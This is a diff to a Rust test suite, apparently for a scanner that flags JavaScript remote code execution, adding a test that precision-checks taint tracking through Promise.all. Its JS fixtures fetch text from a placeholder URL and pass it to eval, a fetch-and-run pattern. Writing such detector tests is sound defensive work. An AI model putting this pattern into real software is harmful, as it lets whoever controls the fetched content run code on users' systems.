@@ -1690,6 +1690,47 @@ fn promise_callbacks_preserve_remote_response_to_execution() {
 }
 
 #[test]
+fn promise_aggregation_preserves_array_slots_without_overtainting() {
+    let root = temporary_directory("promise-aggregation");
+    fs::write(
+        root.join("positive.js"),
+        br#"async function boot() {
+  const [response] = await Promise.all([fetch('https://example.invalid/control')]);
+  eval(await response.text());
+}
+boot();"#,
+    )
+    .unwrap();
+    fs::write(
+        root.join("negative.js"),
+        br#"async function boot() {
+  const [value] = await Promise.all(['constant', fetch('https://example.invalid/content')]);
+  eval(value);
+}
+boot();"#,
+    )
+    .unwrap();
+
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    let executions = report["findings"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .filter(|finding| finding["id"] == "JS-REMOTE-CODE-EXECUTION")
+        .collect::<Vec<_>>();
+    assert_eq!(executions.len(), 1, "{}", report["findings"]);
+    assert!(
+        executions[0]["file"]
+            .as_str()
+            .unwrap()
+            .contains("positive.js")
+    );
+    fs::remove_dir_all(root).unwrap();
+}
+
+#[test]
 fn loop_and_try_bodies_are_not_silently_dropped() {
     let root = temporary_directory("control-bodies");
     fs::write(root.join("main.js"), b"async function boot() { const response = await fetch('https://example.invalid/x'); try { for (let i = 0; i < 1; i++) { eval(await response.text()); } } catch (error) { console.log(error); } } boot();").unwrap();
